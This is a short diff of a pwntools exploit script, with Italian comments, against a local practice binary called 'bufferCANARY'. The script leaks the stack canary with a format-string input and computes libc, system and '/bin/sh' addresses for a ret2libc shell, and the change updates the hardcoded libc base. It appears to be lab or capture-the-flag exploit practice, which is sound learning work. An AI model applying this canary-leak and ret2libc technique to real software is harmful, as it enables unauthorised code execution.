@@ -3,6 +3,7 @@ from pwn import *
 
 p = process(b"./bufferCANARY")
 
+
 m = p.recvuntil(b"username\n")
 log.info(m)
 p.sendline(b"%43$llx")
@@ -13,7 +14,7 @@ log.success(f'Canary:{hex(canary)}')
 
 offset = b"\x41" * 520
 
-libc_base =  0x00007ffff7da1000     # Ottenuto con      ldd buffer
+libc_base =  0x00007ffff7dae000     # Ottenuto con      ldd buffer
 system = libc_base + 0x50f10        # Ottenuto con      readelf -s  /usr/lib/libc.so.6 | grep "system"
 bin_sh = libc_base + 0x1aae28       # Ottenuto con      strings -a -t x /usr/lib/libc.so.6| grep /bin/sh
 
